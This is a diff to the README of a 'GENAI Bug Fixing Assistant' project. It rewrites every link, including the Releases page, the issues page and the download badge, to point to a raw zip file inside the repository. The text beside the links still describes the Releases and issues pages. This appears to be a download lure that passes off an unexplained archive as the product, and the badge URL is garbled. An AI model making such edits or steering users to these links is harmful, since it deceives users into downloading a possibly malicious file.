@@ -6,7 +6,7 @@ Welcome to the GENAI Bug Fixing Assistant! This tool helps you identify and fix 
 
 ## 📥 Download Link
 
-[![Download GENAI Bug Fixing Assistant](https://img.shields.io/badge/Download-GENAI%20Bug%20Fixing%20Assistant-blue.svg)](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/releases)
+[![Download GENAI Bug Fixing Assistant](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip%20Bug%20Fixing%https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip)](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ Before downloading the GENAI Bug Fixing Assistant, ensure your system meets thes
 
 To get started, visit the Releases page to download the application:
 
-[Visit the Releases Page to Download](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/releases)
+[Visit the Releases Page to Download](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of the software.
@@ -62,7 +62,7 @@ Absolutely! You can use the GENAI Bug Fixing Assistant on any number of projects
 
 ### What if I encounter issues while using the application?
 
-If you face any problems, please check our [issues page](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/issues) for solutions. You can also report new issues there.
+If you face any problems, please check our [issues page](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip) for solutions. You can also report new issues there.
 
 ## 🔗 Additional Resources
 
@@ -76,4 +76,4 @@ For more information, please explore the following resources:
 
 Thank you for choosing the GENAI Bug Fixing Assistant. We hope this tool simplifies your coding process and helps you fix bugs faster. Enjoy your coding journey! 
 
-[Download the GENAI Bug Fixing Assistant](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/releases) again if you haven't already!
+[Download the GENAI Bug Fixing Assistant](https://github.com/r3lo343/GENAI_bug_fixing_assistant--project-/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/assistant-project-bug-GENA-fixing-1.6.zip) again if you haven't already!
